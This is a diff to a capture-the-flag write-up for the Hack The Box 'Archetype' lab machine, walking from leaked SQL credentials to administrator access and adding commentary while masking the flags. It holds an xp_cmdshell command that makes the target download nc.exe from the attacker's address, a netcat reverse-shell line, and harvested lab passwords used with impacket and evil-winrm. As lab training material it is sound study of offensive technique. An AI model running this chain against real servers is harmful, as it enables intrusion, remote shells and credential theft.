@@ -48,6 +48,7 @@ smbclient \\\\$IP\\backups
     </Configuration>
 </DTSConfiguration> 
 ```
+**Credentials found**: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`, this credential is from sql server, try using this to connect to MSSQL Server with impacket.
 
 ```bash
 git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket && cd /opt/impacket
@@ -58,15 +59,16 @@ sudo docker build . -t impacket
 mssqlclient -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.185.63 -windows-auth
 ```
 
-**Remote Code Execution Procedures**:
+**Procedures to get Reverse Shell**:
 ```bash
-enable_xp_cmdshell
+help # what procedures do you have?
+enable_xp_cmdshell # xp_cmdshell for RCE
 xp_cmdshell powershell curl [kali-tun0]/nc.exe -o C:\\Users\Public\nc.exe
 xp_cmdshell powershell C:\\Users\Public\nc.exe -e cmd.exe [kali-tun0] 8888 # reverse-shell here!!
 ```
 
-Using winPEAS to enumerate machine to find way to priviledge escalation
-**file contain admin password**:
+Using winPEAS to enumerate machine in order to find way to priviledge escalation
+**file contain admin password found**:
 ```bash
 powershell ./winPEAS.exe
 # found: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -76,17 +78,18 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 
 **credential found**: `\\Archetype\backups /user:administrator MEGACORP_4dm1n!!`
 
+Ok, first thing first, find user flag:
 ```bash
 where -r c:\\ *.txt 
 # found: c:\Users\sql_svc\Desktop\user.txt
 type c:\Users\sql_svc\Desktop\user.txt
 ```
 
-**user flag**: `HTB{3e7b102e78218e935bf3f4951fec21a3}`
+**user flag**: `HTB{3e7b102e78218e935bf3f4951feXXXXX}`
 
-Because we don't have(don't know how to have) interactive shell so we can't supply password for `runas`(cannot one line) cmd command!!, windows don't directly have a way to switch to another account in shell.
+Because we don't have(don't know how to get) interactive shell so we can't supply password for `runas`(cannot one line either) cmd command!!, windows don't directly have a way to switch to another account in shell.
 
-**Remote??**:
+**Remote??**: What to do?? test windows remote port
 ```bash
 nmap -p 3389 -v 10.129.185.63
 # PORT     STATE  SERVICE
@@ -97,11 +100,11 @@ nmap -v -p 5985,5986 10.129.185.63
 # 5986/tcp closed wsmans
 # 5985/tcp open  wsman
 ```
-yes, yes, yes, RDP!!
+yes, yes, yes, WinRM, remote management in CLI(GUI RDP port 3389)!!
 ```bash
 evil-winrm -i 10.129.185.63 -p 5985 -u administrator -p MEGACORP_4dm1n!!
 # success!!
 type C:\\Users\Administrator\Desktop\root.txt
 ```
 
-**root flag**: `HTB{b91ccec3305e98240082d4474b848528}`
+**root flag**: `HTB{b91ccec3305e98240082d4474b8XXXXX}`
